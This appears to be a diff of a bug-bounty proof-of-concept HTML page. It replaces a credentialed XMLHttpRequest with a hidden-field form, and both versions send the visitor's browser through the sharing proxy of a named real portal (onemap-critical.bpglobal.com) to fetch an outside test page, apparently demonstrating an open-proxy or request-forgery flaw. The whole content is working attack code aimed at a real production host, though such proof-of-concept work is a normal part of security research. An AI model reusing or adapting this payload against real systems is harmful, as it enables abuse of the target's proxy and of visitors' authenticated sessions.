@@ -6,41 +6,11 @@
 
   <script>history.pushState('', '', '/')</script>
 
-    <script>
+    <form action="https://onemap-critical.bpglobal.com/portal/sharing/proxy">
 
-      function submitRequest()
+      <input type="hidden" name="https&#58;&#47;&#47;bugbounty&#45;web&#46;github&#46;io&#47;bbrepo&#47;test&#46;html" value="" />
 
-      {
-
-        var xhr = new XMLHttpRequest();
-
-        xhr.open("GET", "https:\/\/onemap-critical.bpglobal.com\/portal\/sharing\/proxy?https:\/\/bugbounty-web.github.io\/bbrepo\/test.html", true);
-
-        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9");
-
-        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
-        
-	xhr.setRequestHeader("Referer", "en-US,en;q=0.9");
-
-        xhr.withCredentials = true;
-
-        var body = "";
-
-        var aBody = new Uint8Array(body.length);
-
-        for (var i = 0; i < aBody.length; i++)
-
-          aBody[i] = body.charCodeAt(i); 
-
-        xhr.send(new Blob([aBody]));
-
-      }
-
-    </script>
-
-    <form action="#">
-
-      <input type="button" value="Submit request" onclick="submitRequest();" />
+      <input type="submit" value="Submit request" />
 
     </form>
 
